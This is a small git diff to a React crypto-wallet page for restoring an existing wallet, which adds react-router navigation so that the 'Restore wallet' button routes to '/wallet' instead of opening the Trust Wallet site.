@@ -1,4 +1,5 @@
 import { useState } from 'react'
+import { useNavigate } from 'react-router-dom'
 import {
   IoArrowBack,
   IoChevronForward,
@@ -36,6 +37,7 @@ const networks = [
 ]
 
 function AddExistingWalletPage() {
+  const navigate = useNavigate()
   const [step, setStep] = useState('wallets')
   const [showSafetySheet, setShowSafetySheet] = useState(false)
   const [checkedItems, setCheckedItems] = useState([])
@@ -227,7 +229,7 @@ function AddExistingWalletPage() {
           <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
         </section>
         <section className="restore-actions">
-          <button className="continue-button active" type="button" onClick={openTrustWalletSite}>
+          <button className="continue-button active" type="button" onClick={() => navigate('/wallet')}>
             Restore wallet
           </button>
           <button className="secret-help" type="button" onClick={openTrustWalletSite}>
